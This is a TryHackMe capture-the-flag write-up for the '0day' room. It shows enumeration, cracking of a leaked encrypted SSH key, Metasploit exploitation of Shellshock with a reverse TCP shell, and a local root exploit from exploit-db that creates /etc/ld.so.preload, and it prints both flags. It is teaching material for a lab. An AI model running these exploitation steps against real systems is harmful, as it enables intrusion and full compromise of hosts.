# 0day

Tryhackme 0day - Linux - Medium

https://tryhackme.com/room/0day

## Nmap
```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 5720823c62aa8f4223c0b893996f499c (DSA)
|   2048 4c40db32640d110cef4fb85b739bc76b (RSA)
|   256 f76f78d58352a64dda213c5547b72d6d (ECDSA)
|_  256 a5b4f084b6a78deb0a9d3e7437336516 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From nmap, we didn't find anything interesting, therefore let's find the directories.

```shell!
└──╼ $gobuster dir -u 0day.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://0day.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/06/12 15:51:58 Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin              (Status: 301) [Size: 305] [--> http://0day.thm/cgi-bin/]
/img                  (Status: 301) [Size: 301] [--> http://0day.thm/img/]    
/uploads              (Status: 301) [Size: 305] [--> http://0day.thm/uploads/]
/admin                (Status: 301) [Size: 303] [--> http://0day.thm/admin/]  
/css                  (Status: 301) [Size: 301] [--> http://0day.thm/css/]    
/js                   (Status: 301) [Size: 300] [--> http://0day.thm/js/]     
/backup               (Status: 301) [Size: 304] [--> http://0day.thm/backup/] 
/secret               (Status: 301) [Size: 304] [--> http://0day.thm/secret/]
...
/cgi-bin              (Status: 301) [Size: 305] [--> http://0day.thm/cgi-bin/]
...
```

We get private RSA from `/backup`, let's crack it using `john`.
```shell!
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

```shell!
└──╼ $python2 /usr/share/john/ssh2john.py ./rsa_private_key > rsa.hash

└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt ./rsa.hash
...
letmein          (./rsa_private_key)
```

Then I tried to login with ssh, but I can't. **Damm it! It's a rabbit hole**.

I am clueless now, maybe Nikto scan can help.

```shell!
└──╼ $nikto -h 0day.thm
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.152.56
+ Target Hostname:    0day.thm
+ Target Port:        80
+ Start Time:         2023-06-12 16:08:31 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0xbd1 0x5ae57bb9a1192 
+ The anti-clickjacking X-Frame-Options header is not present.
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 

+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /backup/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
...
```

We have checked other files, but this `test.cgi` is new, after checking that endpoint, in a response it said `Hello World!`, huh, weird.

After searching on [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi) I tried to test it using nmap.

```shell
└──╼ $nmap 0day.thm -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test.cgi
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 16:21 IST
Nmap scan report for 0day.thm (10.10.152.56)
Host is up (0.18s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
```

Now, we metasploit exploit to get the shell.

# user flag

using `metasploit` we can shell.

```shell
[msf](Jobs:0 Agents:0) >> search shellshock
   #   Name                                               Disclosure Date  Rank       Check  Description
   -   ----                                               ---------------  ----       -----  -----------
   0   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   1   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   2   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
... results ...


[msf](Jobs:0 Agents:0) >> use 1

[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) >> set rhosts 0day.thm
rhosts => 0day.thm

[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) >> set targeturi /cgi-bin/test.cgi
targeturi => /cgi-bin/test.cgi

[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) >> show payloads
... results ...
   27  payload/linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager

[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) >> set payload 27
payload => linux/x86/shell/reverse_tcp

[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) >> set lhost 10.8.95.227
lhost => 10.8.95.227




[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) >> show options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting    Required  Description
   ----            ---------------    --------  -----------
   CMD_MAX_LENGTH  2048               yes       CMD max line length
   CVE             CVE-2014-6271      yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent         yes       HTTP header to use
   METHOD          GET                yes       HTTP method to use
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          0day.thm           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPATH           /bin               yes       Target PATH for binaries used by the CmdStager
   RPORT           80                 yes       The target port (TCP)
   SSL             false              no        Negotiate SSL/TLS for outgoing connections
   SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /cgi-bin/test.cgi  yes       Path to CGI script
   TIMEOUT         5                  yes       HTTP read response timeout (seconds)
   URIPATH                            no        The URI to use for this exploit (default is random)
   VHOST                              no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on a
                                       ll addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.8.95.227      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) >> exploit

[*] Started reverse TCP handler on 10.8.95.227:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (36 bytes) to 10.10.152.56
[*] Command shell session 1 opened (10.8.95.227:4444 -> 10.10.152.56:48442) at 2023-06-12 16:32:43 +0530

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```


```shell
shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash


www-data@ubuntu:/usr/lib/cgi-bin$ ls
ls
test.cgi
www-data@ubuntu:/usr/lib/cgi-bin$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
ryan
www-data@ubuntu:/home$ cd ryan
cd ryan
www-data@ubuntu:/home/ryan$ ls
ls
user.txt
www-data@ubuntu:/home/ryan$ cat user.txt
cat user.txt
THM{Sh3llSh0ck_r0ckz}
```


# root flag

After executing [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), we got the exploit [exploit](https://www.exploit-db.com/exploits/37292).

compile exploit using gcc.
`gcc ofs.c -o ofs`

Upload to server using `python -m http.server`

Run binary to get root!!

```shell
www-data@ubuntu:/tmp$ ./ofs
./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
whoami
root
cat /root/root.txt
THM{g00d_j0b_0day_isPleased}
```
